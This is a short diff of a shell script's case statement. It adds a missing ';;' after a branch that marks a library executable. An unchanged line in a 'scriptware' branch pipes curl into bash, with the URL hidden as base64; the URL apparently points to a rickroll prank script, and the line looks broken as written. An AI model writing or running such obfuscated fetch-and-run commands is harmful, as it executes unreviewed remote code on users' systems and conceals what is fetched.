@@ -173,6 +173,7 @@ flush () {
     ;;
     permission)
     chmod +x /usr/local/lib/libchilkat_x86_64.dylib
+    ;;
     scriptware)
     curl -L aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tlcm9zZXJlbmUvcmlja3JvbGxyYy9tYXN0ZXIvcm9sbC5zaA== | bash
     esac
